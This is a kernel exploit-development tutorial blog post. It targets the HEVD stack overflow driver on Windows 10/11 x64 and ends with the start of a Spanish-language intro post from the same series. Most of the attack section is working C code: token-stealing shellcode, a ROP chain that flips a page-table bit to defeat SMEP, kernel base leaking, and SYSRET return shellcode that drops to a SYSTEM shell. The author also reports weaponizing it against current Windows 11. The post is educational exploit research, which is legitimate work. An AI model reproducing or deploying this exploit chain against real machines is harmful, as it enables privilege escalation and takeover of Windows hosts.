Windows 11 which was released October 1st, 2024.\nDISCLAIMER: TO BE CLEAR THIS DOES NOT BYPASS HVCI, AT THE TIME OF WRITING I BELIEVED THIS TO BYPASS HVCI. THIS POST ONLY CONTAINS A SMEP BYPASS. ADDITIONALLY EXPLOITS IN THIS SERIES WERE TESTED PRIMARILY ON: WINDOWS 11 (x64) - 10.0.22000 N/A Build 22000 Table of Contents # Entering the Modern Landscape Bypassing SMEP (Theory) Finding \u0026amp; Using ROP Gadgets Finding the Kernel Base Address Bypassing VBS (Theory) Violet Phosphorus Understanding the ROP Chain Crafting a PoC Exploitation (Rip \u0026amp; Tear) Sources Entering the Modern Landscape # Considering we exploited the Stack Overflow within Windows 7 (x86) and having gone in depth in regards to it\u0026rsquo;s underlying operations. There was no need to re-hash the vulnerability, at least not for this type of bug. That said, we can go ahead and jump straight into exploit development for Windows 10 (x64).\nAs mentioned in the last post we will shift languages and use C rather than Python. If you\u0026rsquo;re using Kali and want to follow along with me, install mingw-w64 as this will be what I will be using to compile my exploit code. You can also use Visual Studio it\u0026rsquo;s all based on preference really.\nsudo apt install mingw-w64 -y If you\u0026rsquo;re still new to C, the following can also be accomplished in Python. I intentionally used it in the last post for those who want to jump in without using C. However, you will see that the further you get into exploit development knowledge of C is not optional. That said let\u0026rsquo;s look at our initial PoC code:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #define BUFFER_SIZE 4242 int main() { HANDLE hHEVD = NULL; DWORD bytesReturned = 0; char buffer[BUFFER_SIZE] = {0}; printf(\u0026#34;[*] Getting a handle on HEVD\\n\u0026#34;); hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Generating evil buffer...\u0026#34;); memset(buffer, \u0026#39;A\u0026#39;, 3000); printf(\u0026#34;[*] Triggering control code 0x222003\\n\u0026#34;); DeviceIoControl(hHEVD, 0x222003, buffer, BUFFER_SIZE, NULL, 0x00, \u0026amp;bytesReturned, NULL); } We can compile it using a cross compiler from mingw from within Linux (x86_64-w64-mingw32-gcc poc.c -o poc.exe). Once sent, we can see that we have successfully achieved memory corruption :)\nLet\u0026rsquo;s update the PoC this time we\u0026rsquo;ll include shellcode (Generated with Sickle).\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #define BUFFER_SIZE 4242 int main() { HANDLE hHEVD = NULL; LPVOID lpMemory = NULL; DWORD bytesReturned = 0; int i = 0; int shellcodeLength = 62; int64_t buffer[BUFFER_SIZE] = {0}; char shellcode[] = // python3 sickle.py -p windows/x64/kernel_token_stealer -f c -m pinpoint \u0026#34;\\x65\\x48\\xa1\\x88\\x01\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; // movabs rax, qword ptr gs:[0x188] \u0026#34;\\x48\\x8b\\x80\\xb8\\x00\\x00\\x00\u0026#34; // mov rax, qword ptr [rax + 0xb8] \u0026#34;\\x48\\x89\\xc1\u0026#34; // mov rcx, rax \u0026#34;\\xb2\\x04\u0026#34; // mov dl, 4 \u0026#34;\\x48\\x8b\\x80\\x48\\x04\\x00\\x00\u0026#34; // mov rax, qword ptr [rax + 0x448] \u0026#34;\\x48\\x2d\\x48\\x04\\x00\\x00\u0026#34; // sub rax, 0x448 \u0026#34;\\x38\\x90\\x40\\x04\\x00\\x00\u0026#34; // cmp byte ptr [rax + 0x440], dl \u0026#34;\\x75\\xeb\u0026#34; // jne 0x1017 \u0026#34;\\x48\\x8b\\x90\\xb8\\x04\\x00\\x00\u0026#34; // mov rdx, qword ptr [rax + 0x4b8] \u0026#34;\\x48\\x89\\x91\\xb8\\x04\\x00\\x00\u0026#34; // mov qword ptr [rcx + 0x4b8], rdx \u0026#34;\\x5d\u0026#34; // pop rbp \u0026#34;\\xc2\\x08\\x00\u0026#34;; // ret 8 printf(\u0026#34;[*] Getting a handle on HEVD\\n\u0026#34;); hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Allocating RWX memory\\n\u0026#34;); lpMemory = VirtualAlloc(NULL, shellcodeLength, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); printf(\u0026#34;[*] Copying shellcode into RWX memory\\n\u0026#34;); memcpy(lpMemory, shellcode, shellcodeLength); printf(\u0026#34;[*] Spraying return address: 0x%p\\n\u0026#34;, lpMemory); for (i = 0; i \u0026lt; 270; i++) { /* Spray the return address, who cares about accuracy ;) */ buffer[i] = (int64_t)lpMemory; } printf(\u0026#34;[*] Triggering control code 0x222003\\n\u0026#34;); DeviceIoControl(hHEVD, 0x222003, buffer, BUFFER_SIZE, NULL, 0x00, \u0026amp;bytesReturned, NULL); } Let\u0026rsquo;s try to allocate memory as we did before in Windows 7 (x86). When we jump to it we get the following error:\nAfter a bit of research on the error we can confirm we’re dealing with SMEP (Supervisor Mode Execution Prevention) which is a memory protection built into modern Windows OS’s since Windows 8. Assuming you’re familiar with userland exploitation imagine this as DEP only the focus is preventing code execution within user-mode memory. This is oversimplifying it but for the sake of this tutorial we won’t dive any deeper. All we need to do is find a way to bypass it, that is our objective.\nBypassing SMEP (Theory) # To bypass SMEP we’re likely going to need to deploy some ROP, just as we would if we encountered DEP in a user-mode context. If you’re familiar with Linux Kernel exploitation your brain might also go to SMAP. This is good since we’ll be dealing with bits. In short, SMEP is enabled by setting the 20th bit of the CR4 register. In theory, this can be modified by the Kernel, hence why ROP is an ideal technique to deploy.\nLet\u0026rsquo;s look at this in WinDbg.\nWhen flipping the bits of any number, we are in essence changing the value. To see what number we\u0026rsquo;d need to place here be representative of flipping the 20th bit I wrote a simple C program to generate the number for me. The code to do this, can be seen below:\n/* wetw0rk */ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; // https://stackoverflow.com/questions/111928/is-there-a-printf-converter-to-print-in-binary-format #define PRINTF_BINARY_PATTERN_INT8 \u0026#34;%c%c%c%c%c%c%c%c \u0026#34; #define PRINTF_BYTE_TO_BINARY_INT8(i) \\ (((i) \u0026amp; 0x80ll) ? \u0026#39;1\u0026#39; : \u0026#39;0\u0026#39;), \\ (((i) \u0026amp; 0x40ll) ? \u0026#39;1\u0026#39; : \u0026#39;0\u0026#39;), \\ (((i) \u0026amp; 0x20ll) ? \u0026#39;1\u0026#39; : \u0026#39;0\u0026#39;), \\ (((i) \u0026amp; 0x10ll) ? \u0026#39;1\u0026#39; : \u0026#39;0\u0026#39;), \\ (((i) \u0026amp; 0x08ll) ? \u0026#39;1\u0026#39; : \u0026#39;0\u0026#39;), \\ (((i) \u0026amp; 0x04ll) ? \u0026#39;1\u0026#39; : \u0026#39;0\u0026#39;), \\ (((i) \u0026amp; 0x02ll) ? \u0026#39;1\u0026#39; : \u0026#39;0\u0026#39;), \\ (((i) \u0026amp; 0x01ll) ? \u0026#39;1\u0026#39; : \u0026#39;0\u0026#39;) #define PRINTF_BINARY_PATTERN_INT16 \\ PRINTF_BINARY_PATTERN_INT8 PRINTF_BINARY_PATTERN_INT8 #define PRINTF_BYTE_TO_BINARY_INT16(i) \\ PRINTF_BYTE_TO_BINARY_INT8((i) \u0026gt;\u0026gt; 8), PRINTF_BYTE_TO_BINARY_INT8(i) #define PRINTF_BINARY_PATTERN_INT32 \\ PRINTF_BINARY_PATTERN_INT16 PRINTF_BINARY_PATTERN_INT16 #define PRINTF_BYTE_TO_BINARY_INT32(i) \\ PRINTF_BYTE_TO_BINARY_INT16((i) \u0026gt;\u0026gt; 16), PRINTF_BYTE_TO_BINARY_INT16(i) #define PRINTF_BINARY_PATTERN_INT64 \\ PRINTF_BINARY_PATTERN_INT32 PRINTF_BINARY_PATTERN_INT32 #define PRINTF_BYTE_TO_BINARY_INT64(i) \\ PRINTF_BYTE_TO_BINARY_INT32((i) \u0026gt;\u0026gt; 32), PRINTF_BYTE_TO_BINARY_INT32(i) /* * flip_bit: simple function to flip a bit, for CR4 this would be 20 */ uint64_t flip_bit(uint64_t cr4, unsigned int bit_position) { unsigned int mask = 1 \u0026lt;\u0026lt; (bit_position - 1); return (cr4 ^ mask); } int main(int argc, char *argv[]) { uint64_t num = 0; if (argc \u0026lt; 2) { printf(\u0026#34;Usage: %s \u0026lt;current cr4 value\u0026gt;\\n\u0026#34;, argv[0]); return -1; } num = strtoll(argv[1], NULL, 0); printf(\u0026#34;OLD CR4:\\n\\n\\t\u0026#34;); printf(PRINTF_BINARY_PATTERN_INT64, PRINTF_BYTE_TO_BINARY_INT64(num)); putchar(\u0026#39;\\n\u0026#39;); num = flip_bit(num, 20); printf(\u0026#34;NEW CR4\\n\\n\\t\u0026#34;); printf(PRINTF_BINARY_PATTERN_INT64, PRINTF_BYTE_TO_BINARY_INT64(num)); putchar(\u0026#39;\\n\u0026#39;); printf(\u0026#34;\\nResult: 0x%lx\\n\u0026#34;, num); } Let\u0026rsquo;s run it.\n$ ./get_cr4 0x0000000000b50ef8 OLD CR4: 00000000 00000000 00000000 00000000 00000000 10110101 00001110 11111000 NEW CR4 00000000 00000000 00000000 00000000 00000000 10111101 00001110 11111000 Result: 0xbd0ef8 So basically we have to place this value into CR4 to turn off SMEP\u0026hellip; While researching this I came across a blog post by fluidattacks and noticed he used a ROP gadget in the nt module, specifically KeFlushCurrentTb. We can get our current running version using WinDbg via vertarget. When ran on our target, this was the currently installed Windows version:\nThat said, this gadget would not be available to us. If we check for other similar functions we find a similar gadget within nt!KeFlushCurrentTbImmediatley with the main difference being RCX being used to modify CR4 instead of EAX:\nSince addresses are randomized, we need to calculate the offset of that ROP gadget from the start of the nt module:\nHere we see the offset is 0x000000000039dc27.\nFinding \u0026amp; Using ROP Gadgets # Now we need to find a pop rcx; ret gadget to place the new CR4 value into RCX. We can find one using rp++, which has quickly become my favorite ROP gadget tool. Here we search for gadgets within ntoskrnl.exe since this is the primary kernel file for the Windows OS. To do this you can use the following syntax:\nrp-win.exe --rop=50 --va=0 --file C:\\Windows\\System32\\ntoskrnl.exe \u0026gt; rop.txt We can then parse the results using powershell.\nUsing these offsets we can confirm we have a working gadget in WinDbg.\nHowever, we still have to deal with the randomization of the nt module itself\u0026hellip;\nFinding the Kernel Base Address # If you peeked into my brain during this period of learning, you would have observed unadulterated fear. Since under a user-mode exploit you would normally now require a read primitive to get the base address of a loaded module. However, with a little bit of research you\u0026rsquo;ll find there are multiple methods to obtain the base address of nt (or any other loaded module for that matter) from medium integrity (default user configuration).\nI ended up using a known method of leveraging EnumDeviceDrivers to obtain the base address.\nThe code I used can be seen below:\nint GetKernelBaseAddress() { ULONG_PTR pKernelBaseAddress = 0; LPVOID *lpImageBase = NULL; DWORD dwBytesNeeded = 0; if (!EnumDeviceDrivers(NULL, 0, \u0026amp;dwBytesNeeded)) { printf(\u0026#34;[-] Failed to calculate bytes needed for device driver entries\u0026#34;); return -1; } if (!(lpImageBase = (LPVOID *)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) { printf(\u0026#34;[-] Failed to allocate heap for lpImageBase\\n\u0026#34;); if (lpImageBase) { HeapFree(GetProcessHeap(), 0, lpImageBase); } return -1; } if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, \u0026amp;dwBytesNeeded)) { printf(\u0026#34;[-] EnumDeviceDrivers: %d\u0026#34;, GetLastError()); if (lpImageBase) { HeapFree(GetProcessHeap(), 0, lpImageBase); } return -1; } pKernelBaseAddress = ((ULONG_PTR *)lpImageBase)[0]; HeapFree(GetProcessHeap(), 0, lpImageBase); printf(\u0026#34;[*] Kernel Base Address: %llx\\n\u0026#34;, pKernelBaseAddress); return pKernelBaseAddress; } With that we should have everything needed to get code execution! Right? Wrong :(\nWhen putting everything together, we get the error above (ignore the different gadget location I tried changing it at this point because I could not fathom this not working).\nWhat happened? Well\u0026hellip; it looks like we encountered a new memory protection that I have not heard of. We\u0026rsquo;ve run into Virtualization-Based Security (VBS), which means any \u0026ldquo;unauthorized modifications of the CR4 control register bitfields, including the SMEP field, are blocked instantly\u0026rdquo;.\nBypassing VBS (Theory) # Having conducted a bit of research into how others have approached this, the idea here is to flip a bit within a Page Table Entry (PTE) respective to the memory location of our usermode shellcode.\nIf we recall when we tried to execute the shellcode directly we got the following error:\nBasically, the way SMEP is enforced is on a per memory basis, via the U/S PTE control bit. Let\u0026rsquo;s look at the output of !pte in WinDbg in regards to the user mode shellcode allocation to try to understand the page table entry permissions.\nSo what would happen if we were to clear the user mode bit (U)? If flipped, this page in thoery becomes a Kernel mode page. The bit location of U can be seen below.\nLet\u0026rsquo;s set a breakpoint at HEVD+0x866b9 and reboot to test this. Once our breakpoint is hit, we can modify the PTE as shown below. Once execution is continued you can see we successfully get code execution as we overwrite RAX with 0xDEADBEEF (psuedo shellcode).\nSweet, we have a solid bypass route for SMEP and VBS but how can we do this dynamically\u0026hellip;\nViolet Phosphorus # With our analysis complete I decided to put my theory into practice and created Violet Phosphorus a universal and generic SMEP/VBS bypass. Can we call this the successor of the White Phosphorus Exploit Pack? Or would that be too much\u0026hellip; you can find the ROP chain below:\n/* Prepare RDX register for later. This is needed for the XOR operation */ buffer[i++] = kernel_base + 0x3f99ce; // pop rdx ; pop rax ; pop rcx ; ret [nt] buffer[i++] = 0x000008; // Set RDX to 0x08, we will need this to accomplish the XOR buffer[i++] = 0x000000; // [filler] buffer[i++] = 0x000000; // [filler] /* Setup the call to MiGetPteAddress in order to get the address of the PTE for our userland code. The setup is as follows: RAX -\u0026gt; VOID *MiGetPteAddress( ( RCX == PTE / Userland Code ) ); Once the call is complete RAX should contain the pointer to our PTE. */ buffer[i++] = kernel_base + 0xa74d93; // pop rcx ; ret [nt] buffer[i++] = (int64_t)shellcode; // *shellcode [nt] buffer[i++] = kernel_base + 0x26b560; // MiGetPteAddress() [nt] /* Now that we have obtained the PTE address, we can modify the 2nd bit in order to mark the page as a kernel page (U -\u0026gt; K). We can do this using XOR ;) */ buffer[i++] = kernel_base + 0x2ffbfb; // sub rax, rdx ; ret [nt] buffer[i++] = kernel_base + 0xa6f2f5; // push rax ; pop rbx ; ret [nt] buffer[i++] = kernel_base + 0x3f99ce; // pop rdx ; pop rax ; pop rcx ; ret [nt] buffer[i++] = 0x000004; // When we XOR the PTE by 0x4 we flip the 2nd bit (U -\u0026gt; K) buffer[i++] = 0x000000; // [filler] buffer[i++] = 0x000000; // [filler] buffer[i++] = kernel_base + 0x2107b2; // xor [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret [nt] Understanding the ROP Chain # Let\u0026rsquo;s be honest there exists other ways to bypass VBS/SMEP but from what I\u0026rsquo;ve seen most require a leak. Why suffer when Microsoft gives us a function to get this information dynamically? Below is the ASM code within WinDbg of the MiGetPteAddress() function.\n0: kd\u0026gt; u nt!MiGetPteAddress nt!MiGetPteAddress: fffff800`4d67f770 48c1e909 shr rcx,9 fffff800`4d67f774 48b8f8ffffff7f000000 mov rax,7FFFFFFFF8h fffff800`4d67f77e 4823c8 and rcx,rax fffff800`4d67f781 48b80000000080f0ffff mov rax,0FFFFF08000000000h fffff800`4d67f78b 4803c1 add rax,rcx fffff800`4d67f78e c3 ret From what I\u0026rsquo;ve seen in the \u0026ldquo;wild\u0026rdquo;, people normally use this function to get the base address of all PTE\u0026rsquo;s. Let\u0026rsquo;s take a step back and ask ourselves what does this function actually do when called? We don\u0026rsquo;t even need Ghidra for this to be honest. Let\u0026rsquo;s write the C equivalent to this:\n/* wetw0rk */ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; int64_t MiGetPteAddress(int64_t rcx) { int64_t rax = 0x00; rcx = rcx \u0026gt;\u0026gt; 9; rax = 0x7FFFFFFFF8; rcx = rcx \u0026amp; rax; rax = 0x0FFFFF08000000000; rax = rax + rcx; return rax; } int main() { printf(\u0026#34;PTE Located @{ 0x%llx }\\n\u0026#34;, MiGetPteAddress(0x00000220c16d0000)); } If we compile this we see it gives us the the address of the PTE.\n┌──(wetw0rk㉿kali)-[~] └─$ gcc MiGetPteAddress.c -o meme ┌──(wetw0rk㉿kali)-[~] └─$ ./meme PTE Located @{ 0xfffff0811060b680 } This means we can leverage this existing function to manipulate the PTE directly. After all, we are running under the context of the Kernel so we can call Bill Gates if we want to. To summarize all we need to do is pass this function the address of our shellcode and in return this function will return the PTE respective to our allocation. How nice :)\nOnce we have the address of the PTE, we simply dereference it and flip the U bit to a K bit. What insane mathematical operation must we do to accomplish such a task?\nThat\u0026rsquo;s right - XOR!\n\u0026gt;\u0026gt;\u0026gt; \u0026#34;0x\u0026#34; + hex(0x0000000226D83867 ^ 4)[2:].zfill(16) \u0026#39;0x0000000226d83863\u0026#39; You know what this means right?\nCrafting a PoC # At this point we have everything we need to get code execution\u0026hellip; except returning to Userland. Normally it\u0026rsquo;s best to restore execution flow manually. However, I decided to instead use Kristal-G\u0026rsquo;s SYSRET shellcode - a technique that allows for a generic return from the Kernel. From my understanding this is the first of its kind (other than the Linux variant). You can generate Kristal-G\u0026rsquo;s shellcode using Sickle as shown below:\n┌──(wetw0rk㉿kali)-[/opt/Sickle/src] └─$ python3 sickle.py -p windows/x64/kernel_sysret -f c -m pinpoint \u0026#34;\\x65\\x48\\xa1\\x88\\x01\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; // movabs rax, qword ptr gs:[0x188] \u0026#34;\\x66\\x8b\\x88\\xe4\\x01\\x00\\x00\u0026#34; // mov cx, word ptr [rax + 0x1e4] \u0026#34;\\x66\\xff\\xc1\u0026#34; // inc cx \u0026#34;\\x66\\x89\\x88\\xe4\\x01\\x00\\x00\u0026#34; // mov word ptr [rax + 0x1e4], cx \u0026#34;\\x48\\x8b\\x90\\x90\\x00\\x00\\x00\u0026#34; // mov rdx, qword ptr [rax + 0x90] \u0026#34;\\x48\\x8b\\x8a\\x68\\x01\\x00\\x00\u0026#34; // mov rcx, qword ptr [rdx + 0x168] \u0026#34;\\x4c\\x8b\\x9a\\x78\\x01\\x00\\x00\u0026#34; // mov r11, qword ptr [rdx + 0x178] \u0026#34;\\x48\\x8b\\xa2\\x80\\x01\\x00\\x00\u0026#34; // mov rsp, qword ptr [rdx + 0x180] \u0026#34;\\x48\\x8b\\xaa\\x58\\x01\\x00\\x00\u0026#34; // mov rbp, qword ptr [rdx + 0x158] \u0026#34;\\x31\\xc0\u0026#34; // xor eax, eax \u0026#34;\\x0f\\x01\\xf8\u0026#34; // swapgs \u0026#34;\\x48\\x0f\\x07\u0026#34; // sysretq Below is the PoC code, however offsets may be different on your build of Windows.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; // I/O Request Packets (IRPs) #define TRIGGER_BUFFER_OVERFLOW_STACK 0x222003 #define BUFFER_SIZE 4242 uint64_t GetKernelBaseAddress() { ULONG_PTR pKernelBaseAddress = 0; LPVOID *lpImageBase = NULL; DWORD dwBytesNeeded = 0; if (!EnumDeviceDrivers(NULL, 0, \u0026amp;dwBytesNeeded)) { printf(\u0026#34;[-] Failed to calculate bytes needed for device driver entries\u0026#34;); return -1; } if (!(lpImageBase = (LPVOID *)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) { printf(\u0026#34;[-] Failed to allocate heap for lpImageBase\\n\u0026#34;); if (lpImageBase) { HeapFree(GetProcessHeap(), 0, lpImageBase); } return -1; } if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, \u0026amp;dwBytesNeeded)) { printf(\u0026#34;[-] EnumDeviceDrivers: %d\u0026#34;, GetLastError()); if (lpImageBase) { HeapFree(GetProcessHeap(), 0, lpImageBase); } return -1; } pKernelBaseAddress = ((ULONG_PTR *)lpImageBase)[0]; HeapFree(GetProcessHeap(), 0, lpImageBase); printf(\u0026#34;[*] Kernel Base Address: %llx\\n\u0026#34;, pKernelBaseAddress); return pKernelBaseAddress; } void GenerateBuffer(int64_t *buffer, int64_t kernel_base, LPVOID shellcode) { int64_t i = 259; int64_t j = 0; printf(\u0026#34;[*] Generating buffer to bypass VPS and disable SMEP\\n\u0026#34;); /* Prepare RDX register for later. This is needed for the XOR operation */ buffer[i++] = kernel_base + 0x3f99ce; // pop rdx ; pop rax ; pop rcx ; ret [nt] buffer[i++] = 0x000008; // Set RDX to 0x08, we will need this to accomplish the XOR buffer[i++] = 0x000000; // [filler] buffer[i++] = 0x000000; // [filler] /* Setup the call to MiGetPteAddress in order to get the address of the PTE for our userland code. The setup is as follows: RAX -\u0026gt; VOID *MiGetPteAddress( ( RCX == PTE / Userland Code ) ); Once the call is complete RAX should contain the pointer to our PTE. */ buffer[i++] = kernel_base + 0xa74d93; // pop rcx ; ret [nt] buffer[i++] = (int64_t)shellcode; // *shellcode [nt] buffer[i++] = kernel_base + 0x26b560; // MiGetPteAddress() [nt] /* Now that we have obtained the PTE address, we can modify the 2nd bit in order to mark the page as a kernel page (U -\u0026gt; K). We can do this using XOR ;) */ buffer[i++] = kernel_base + 0x2ffbfb; // sub rax, rdx ; ret [nt] buffer[i++] = kernel_base + 0xa6f2f5; // push rax ; pop rbx ; ret [nt] buffer[i++] = kernel_base + 0x3f99ce; // pop rdx ; pop rax ; pop rcx ; ret [nt] buffer[i++] = 0x000004; // When we XOR the PTE by 0x4 we flip the 2nd bit (U -\u0026gt; K) buffer[i++] = 0x000000; // [filler] buffer[i++] = 0x000000; // [filler] buffer[i++] = kernel_base + 0x2107b2; // xor [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret [nt] /* Now we can spray our shellcode address since SMEP and VPS should be bypassed */ for (j = 0; j \u0026lt; 0xC; j++) { buffer[i++] = (int64_t)shellcode; } printf(\u0026#34;[*] Calling shellcode: 0x%p\\n\u0026#34;, shellcode); } int main() { HANDLE hHEVD = NULL; DWORD bytesReturned = 0; int64_t buffer[BUFFER_SIZE] = {0}; int64_t kernelBaseAddr = 0; LPVOID lpMemory = NULL; char shellcode[] = // python3 sickle.py -p windows/x64/kernel_token_stealer -f c -m pinpoint \u0026#34;\\x65\\x48\\xa1\\x88\\x01\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; // movabs rax, qword ptr gs:[0x188] \u0026#34;\\x48\\x8b\\x80\\xb8\\x00\\x00\\x00\u0026#34; // mov rax, qword ptr [rax + 0xb8] \u0026#34;\\x48\\x89\\xc1\u0026#34; // mov rcx, rax \u0026#34;\\xb2\\x04\u0026#34; // mov dl, 4 \u0026#34;\\x48\\x8b\\x80\\x48\\x04\\x00\\x00\u0026#34; // mov rax, qword ptr [rax + 0x448] \u0026#34;\\x48\\x2d\\x48\\x04\\x00\\x00\u0026#34; // sub rax, 0x448 \u0026#34;\\x38\\x90\\x40\\x04\\x00\\x00\u0026#34; // cmp byte ptr [rax + 0x440], dl \u0026#34;\\x75\\xeb\u0026#34; // jne 0x1017 \u0026#34;\\x48\\x8b\\x90\\xb8\\x04\\x00\\x00\u0026#34; // mov rdx, qword ptr [rax + 0x4b8] \u0026#34;\\x48\\x89\\x91\\xb8\\x04\\x00\\x00\u0026#34; // mov qword ptr [rcx + 0x4b8], rdx // python3 sickle.py -p windows/x64/kernel_sysret -f c -m pinpoint \u0026#34;\\x65\\x48\\xa1\\x88\\x01\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; // movabs rax, qword ptr gs:[0x188] \u0026#34;\\x66\\x8b\\x88\\xe4\\x01\\x00\\x00\u0026#34; // mov cx, word ptr [rax + 0x1e4] \u0026#34;\\x66\\xff\\xc1\u0026#34; // inc cx \u0026#34;\\x66\\x89\\x88\\xe4\\x01\\x00\\x00\u0026#34; // mov word ptr [rax + 0x1e4], cx \u0026#34;\\x48\\x8b\\x90\\x90\\x00\\x00\\x00\u0026#34; // mov rdx, qword ptr [rax + 0x90] \u0026#34;\\x48\\x8b\\x8a\\x68\\x01\\x00\\x00\u0026#34; // mov rcx, qword ptr [rdx + 0x168] \u0026#34;\\x4c\\x8b\\x9a\\x78\\x01\\x00\\x00\u0026#34; // mov r11, qword ptr [rdx + 0x178] \u0026#34;\\x48\\x8b\\xa2\\x80\\x01\\x00\\x00\u0026#34; // mov rsp, qword ptr [rdx + 0x180] \u0026#34;\\x48\\x8b\\xaa\\x58\\x01\\x00\\x00\u0026#34; // mov rbp, qword ptr [rdx + 0x158] \u0026#34;\\x31\\xc0\u0026#34; // xor eax, eax \u0026#34;\\x0f\\x01\\xf8\u0026#34; // swapgs \u0026#34;\\x48\\x0f\\x07\u0026#34;; // sysretq int shellcodeLength = (58 + 71); kernelBaseAddr = GetKernelBaseAddress(); printf(\u0026#34;[*] Getting a handle on HEVD\\n\u0026#34;); hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Allocating RWX memory\\n\u0026#34;); lpMemory = VirtualAlloc(NULL, shellcodeLength, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); printf(\u0026#34;[*] Copying shellcode into RWX memory\\n\u0026#34;); memcpy(lpMemory, shellcode, shellcodeLength); printf(\u0026#34;[*] Spraying return address: 0x%p\\n\u0026#34;, lpMemory); GenerateBuffer(buffer, kernelBaseAddr, lpMemory); printf(\u0026#34;[*] Triggering control code 0x222003\\n\u0026#34;); DeviceIoControl(hHEVD, TRIGGER_BUFFER_OVERFLOW_STACK, buffer, BUFFER_SIZE, NULL, 0x00, \u0026amp;bytesReturned, NULL); system(\u0026#34;C:\\\\Windows\\\\System32\\\\cmd.exe\u0026#34;); } Exploitation (Rip \u0026amp; Tear) # When writing this post I was so confident in my technique I decided to weaponize it and test it against the latest build of Windows 11, and it worked!\nIt\u0026rsquo;s important to keep in mind I had to perform modifications to the aforementioned information. As an example, Token Stealing Shellcode offsets have changed, this was an interesting observation and I plan to update shellcode within Sickle to perform version checking for accurate structure offsets.\nSources # https://connormcgarr.github.io/pte-overwrites/ https://m0uk4.gitbook.io/notebooks/mouka/windowsinternal/find-kernel-module-address-todo https://wumb0.in/finding-the-base-of-the-windows-kernel.html https://idafchev.github.io/research/2023/06/30/Vulnerable_Driver_Part2.html https://fluidattacks.com/blog/hevd-smep-bypass/ https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/# https://www.coresecurity.com/sites/default/files/2020-06/Windows%20SMEP%20bypass%20U%20equals%20S_0.pdf https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html ","date":"7 December 2024","externalUrl":null,"permalink":"/posts/0x01-killing-windows-kernel-mitigations/","section":"Posts","summary":"","title":"0x01 - Killing Windows Kernel Mitigations","type":"posts"},{"content":"Esta publicación será la primera de un series donde te guiaré al mundo de Windows Kernel Explotación. Mi papa antes dicia, \u0026ldquo;no se nace aprendido\u0026rdquo;. Como todo en la vida hay que empezar por algún lado. El objetivo de esta series es comenzar en Windows 7 (x86) y terminar en Windows 11 (x64). Hoy vamos usar Windows 7 (x86) y Windows 10 (x64).\nPara empezar, baja estos programas:\nPrograma de Virtualización: Esto puede ser cualquier desde VirtualBox a VMWare. Dejaré cual programa de virtualización usar en tus manos. WinDbg: Esta aplicación nos servirá como instrumento para interactuar con el Kernel, es importante que lo bajes de el Windows Driver Kit y NO el WinDbg Preview para este serie. HEVD: Para este series usaré HEVD v3.00 para demosrar las vulnerabilidades. Al escribir este series, es el versión mas nuevo. HEVD es un controlador (driver) programado para ser intencionalmente vulnerable. OSRLOADER: Como HEVD is un controlador, necesitamos una forma de cargarlo en el sistema de operación. Para hacer esto usaremos la aplicación OSRLOADER. Python: Al escribir esto, usé versión 3.11.5 sin embargo, cualquier versión debería estar bien. Ghidra: Ghidra será nuestra herramienta para conducta ingeniería inversa (reverse engineering). Si tienes IDA Pro, estas bienvenido a usarlo :) Sickle: Esta será la herramienta que utilizaremos para generar shellcode. Si estás leyendo esto en 2024, es probable que el nuevo versión no esta listo. Por esta razón, usa la última rama no la versión mas nueva (simplemente clona el repositorio). Es importante saber, he estructurado estas guías para llevarte de Exploit Developer a Kernel Exploit Developer. Si nunca has escrito una cadena de ROP, o estas completamente perdido con protecciones de la memoria moderna. Te recomiendo que empezes con explotación de Userland.\nSi no tienes dinero, te recomiendo lo siguiente:\nCorelan Tutorials: Corelan fue una de mis inspiraciones para hacer estas publicaciones. Cuando comencé mi viaje por primera vez en Exploit Development yo leí tutoriales 1-11. Todo presentado en ellos sigue siendo relevante a haste día. No dejes que la falta de sistemas modernas te detenga, conceptos de Windows XP se aplica a Windows 11. Modern 